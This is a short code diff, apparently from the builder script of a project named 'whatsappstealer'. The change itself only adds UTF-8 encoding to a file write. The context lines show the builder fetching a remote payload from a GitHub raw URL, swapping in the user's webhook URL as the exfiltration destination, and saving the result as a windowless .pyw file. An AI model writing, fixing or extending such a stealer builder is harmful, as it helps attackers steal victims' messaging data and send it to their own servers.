@@ -51,7 +51,7 @@ def main():
     Write.Print(f"    .$ Fetching payload ...", Colors.green_to_yellow, interval=0.05)
     payload = requests.get("https://raw.githubusercontent.com/xpierroz/whatsappstealer/master/payload.py").text
     
-    with open("whatsapp.pyw", "w") as f:
+    with open("whatsapp.pyw", "w", encoding='utf-8') as f:
         f.write(payload.replace('WEBHOOK = "xpierroz on top"', f'WEBHOOK = "{wbh_url}"'))
         
     Write.Print(f"\n    .$ Payload fetched !", Colors.green_to_cyan, interval=0.05)
